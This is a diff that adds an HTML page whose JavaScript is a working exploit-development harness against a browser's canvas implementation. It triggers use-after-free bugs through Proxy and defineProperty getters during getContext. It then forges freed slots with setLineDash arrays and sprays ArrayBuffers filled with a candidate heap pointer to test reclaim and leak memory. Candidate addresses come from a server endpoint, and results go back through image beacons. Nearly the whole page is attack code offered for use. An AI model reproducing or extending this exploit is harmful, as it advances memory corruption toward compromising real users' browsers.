@@ -1,0 +1,87 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>V527e — validated-candidate pointer-spray reclaim discriminator</title></head>
+<body><script>
+// ONE page, ONE candidate per load, ends the reclaim-vs-decommit debate.
+// Step 1 (vehicle, from DASHFORGE): free a sacrificial proxy-doublecreate context,
+//   forge its slot with m_buffer -> C+0x80, read getLineDash. Survives+returns =>
+//   candidate C is MAPPED in THIS process, right now. Dies => C stale, next load.
+// Step 2 (experiment, pastawithpesto's trigger): defineProperty-alpha getter,
+//   outer 'bitmaprenderer' -> inner 2d ctx FREED (confirmed both consoles tonight).
+// Step 3: spray 500 x 768B ArrayBuffers whose EVERY 8-byte slot = pointer C.
+// Step 4: read stale.lineWidth = state().m_lineWidth = double at [C+0x10]:
+//   returns a NUMBER  => AB RECLAIMED the slot (and the number leaks [C+0x10])
+//   hard death       => slot unmapped = DECOMMIT (C itself proven mapped moments ago)
+function bc(m){var u='beacon?m='+encodeURIComponent('V527E '+m);
+  function f(){try{new Image().src=u+'&t='+Date.now();}catch(e){}}f();setTimeout(f,500);setTimeout(f,1000);}
+function sleep(ms){return new Promise(r=>setTimeout(r,ms));}
+function u64d(bits){var b=new ArrayBuffer(8);new DataView(b).setBigUint64(0,bits);return new Float64Array(b)[0];}
+
+// ---- candidate from the shared DASHFORGE grid ----
+var idx=-1,candHex=null,total=0;
+try{
+  var cx=new XMLHttpRequest();cx.open("GET","/heapcand?v="+Date.now(),false);cx.send();
+  var p=cx.responseText.trim().split(" ");
+  if(p[0]!=="DONE"&&p[0]!=="ERR"&&p.length>=3){idx=parseInt(p[0]);candHex=p[1];total=parseInt(p[2]);}
+}catch(e){bc('HEAPCAND-ERR '+e.message);}
+if(idx<0){bc('E-DONE-OR-ERR '+idx);throw new Error('no cand');}
+var C=BigInt("0x"+candHex);
+
+bc('E-CAND idx='+idx+'/'+total+' cand='+candHex);
+
+// ---- Step 1: dash vehicle — proves C mapped, same process, same load ----
+(function(){
+  var canvas=document.createElement("canvas");canvas.width=1;canvas.height=1;
+  var inner=null,called=false;
+  var settings=new Proxy({},{get:function(t,prop){
+    if(!called&&typeof prop==="string"&&prop!=="then"&&prop!=="toJSON"){called=true;inner=canvas.getContext("2d");}
+    return undefined;}});
+  var outer=canvas.getContext("2d",settings);   // inner's block freed here
+  var f=new Array(90).fill(0);
+  f[14]=u64d(C+0x80n); f[15]=u64d(1n); f[16]=u64d(1n);
+  f[37]=u64d(C+0x200n); f[38]=u64d(4n); f[39]=u64d(4n);
+  f[64]=123456.789; f[65]=987654.321; f[66]=42.5; f[67]=3.25;
+  var keep=[];
+  for(var s=0;s<150;s++){var cv=document.createElement("canvas");cv.width=4;cv.height=4;
+    var cc=cv.getContext("2d");cc.setLineDash(f);keep.push([cv,cc]);}
+  var dash=inner.getLineDash();
+  bc('E-VEH idx='+idx+' cand='+candHex+' alive len='+dash.length+' vals='+Array.prototype.slice.call(dash,0,4).join(","));
+})();
+// ---- vehicle survived => C mapped ----
+sleep(150);
+
+// ---- Step 2: their trigger, fresh element ----
+var innerCtx=null;
+(function(){
+  var c=document.createElement("canvas");c.width=1;c.height=1;
+  var d={};
+  Object.defineProperty(d,"alpha",{get:function(){
+    var ctx=c.getContext("2d");innerCtx=ctx;
+    for(var s=0;s<32;s++)ctx.save();
+    ctx.lineWidth=509.0;
+    return true;
+  }});
+  c.getContext("bitmaprenderer",d);   // frees the 2d ctx via m_context overwrite
+})();
+bc('E-TRIG-OK cand='+candHex);
+sleep(150);
+
+// ---- Step 3: pointer-filled spray ----
+(function(){
+  var filler=u64d(C);                 // every 8-byte slot = pointer C (little-endian: low32 first via f64 bits)
+  var abs=[];
+  for(var i=0;i<500;i++){var ab=new ArrayBuffer(768);var f64=new Float64Array(ab);
+    for(var s2=0;s2<96;s2++)f64[s2]=filler;
+    abs.push(ab);}
+  window.__ekeep=abs;
+  bc('E-SPRAY n=500 cand='+candHex);
+})();
+
+// ---- Step 4: the verdict read ----
+bc('E-LW-PRE cand='+candHex+' idx='+idx);
+try{
+  var lw=innerCtx.lineWidth;
+  bc('E-LW-VALUE idx='+idx+' cand='+candHex+' lw='+lw+' RECLAIM-PROVEN');
+}catch(e){bc('E-LW-EXC idx='+idx+' '+e.name);}
+bc('E-LOAD-DONE idx='+idx);
+setTimeout(function(){bc('E-IDLE cand='+candHex+' stillalive');},3000);
+</script></body></html>
